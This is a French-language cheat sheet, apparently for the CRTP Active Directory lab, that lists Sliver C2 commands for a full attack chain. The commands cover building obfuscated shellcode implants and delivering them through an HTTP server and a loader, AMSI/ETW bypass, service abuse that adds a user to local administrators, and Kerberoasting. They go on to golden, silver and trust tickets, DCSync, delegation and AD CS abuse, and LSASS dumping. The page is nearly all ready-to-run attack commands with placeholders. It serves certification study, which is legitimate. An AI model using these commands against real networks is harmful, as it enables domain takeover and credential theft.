# Sliver - Toutes les commandes

> [!summary] Objectif
> Fiche maître : toute la kill chain CRTP en commandes Sliver, dans l'ordre d'un engagement. Chaque bloc renvoie à sa fiche détaillée. Les valeurs (`X`, clés AES/RC4, SID, mots de passe) sont à remplacer selon l'instance.

## Infrastructure · [[Sliver - Setup et beacons]]

```bash
# Serveur (WSL) + listener
cd /mnt/c/AD/Tools/Sliver && sudo ./sliver-server
[server] sliver > https
# Implant shellcode obfusqué
[server] sliver > generate -b https://172.16.100.X -e -f shellcode -N dcorp-std_https -s ./Implants/dcorp-std_https.bin
# Livraison
cd /mnt/c/AD/Tools/Sliver/Implants && python3 -m http.server 8080
C:\AD\Tools\Sliver\BinLoader.exe 172.16.100.X 8080 dcorp-std_https.bin
# Session + stabilisation
[server] sliver > use <id>
[server] sliver (…) > ps -e explorer.exe
[server] sliver (…) > migrate -p <pid>
```

## Exécution en mémoire · [[Sliver - Exécution et évasion]]

```bash
# Fork & run (PPID spoof)
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/<Tool>.exe' '<args>'
# Self-inject + bypass AMSI/ETW
execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/<Tool>.exe' '<args>'
# BOF / alias armory
armory install <alias>
```

## Énumération · [[Sliver - Énumération AD]]

```bash
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--ldap "(&(objectCategory=person)(objectClass=user))"'
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/ADSearch.exe' '--group "enterprise admins" --domain dollarcorp.moneycorp.local'
execute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "distinguishedname=DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL" --access --ntaccount "dcorp\studentx"'
execute-assembly -p explorer.exe -t 200 '/mnt/c/AD/Tools/Sliver/SharpHound.exe' '-c All'
```

## Privesc & lateral · [[Sliver - Privesc et lateral]]

```bash
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/SharpUp.exe' 'audit'
remote-sc-config -t 100 "" 'AbyssWebServer' 'C:\windows\system32\net.exe localgroup administrators dcorp\studentX /add' 1 2
remote-sc-start "" 'AbyssWebServer'
scshell dcorp-mgmt XblAuthManager
execute -o winrs -r:dcorp-mgmt cmd /c "whoami"
execute-assembly -p explorer.exe -t 60 '/mnt/c/AD/Tools/Sliver/LACheck.exe' 'smb /targets:all'
```

## Kerberos · [[Sliver - Kerberos et tickets]]

```bash
# Kerberoast
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--spn'
execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'kerberoast /user:svcadmin /simple /outfile:hashes.txt'
# OverPass-the-Hash
execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'asktgt /user:svcadmin /aes256:<AES> /opsec /show /ptt'
# Golden / Silver / Diamond
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /aes256:<KRBTGT_AES> /ptt'
# DCSync
lsadump::dcsync /user:dcorp\krbtgt
```

## Délégation · [[Sliver - Delegation et RBCD]]

```bash
# Unconstrained + Printer Bug
execute-assembly -i -M -E -t 0 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'monitor /interval:5 /nowrap'
execute-assembly -p explorer.exe -t 20 '/mnt/c/AD/Tools/Sliver/SpoolSample.exe' 'dcorp-dc.dollarcorp.moneycorp.local dcorp-appsrv.dollarcorp.moneycorp.local'
# Constrained (S4U)
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 's4u /user:websvc /aes256:<AES> /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt'
# RBCD
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/Get-RBCD-Threaded.exe' '-u studentx -p <pwd> -d dollarcorp.moneycorp.local'
```

## AD CS / SQL / persistance · [[Sliver - AD CS, SQL et persistance]]

```bash
# AD CS ESC1/ESC3
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Certify.exe' 'find /vulnerable'
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Certify.exe' 'request /ca:<CA> /template:<T> /altname:administrator'
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'asktgt /user:administrator /certificate:cert.pfx /password:<pwd> /ptt'
# MSSQL
execute-assembly -p explorer.exe -t 60 '/mnt/c/AD/Tools/Sliver/SharpSQL.exe' '-enum'
# Trust key / EA
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'silver /service:krbtgt/MONEYCORP.LOCAL /rc4:<TRUST_KEY> /sid:<CHILD_SID> /sids:<EA_SID> /user:Administrator /ptt'
# LSASS
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/minidumpdotnet.exe' 'lsass C:\Windows\Temp\lsass.dmp'
```

---

**Fiches :**
- [[Sliver - Setup et beacons]]
- [[Sliver - Exécution et évasion]]
- [[Sliver - Énumération AD]]
- [[Sliver - Privesc et lateral]]
- [[Sliver - Kerberos et tickets]]
- [[Sliver - Delegation et RBCD]]
- [[Sliver - AD CS, SQL et persistance]]
- [[Sliver - Index]]
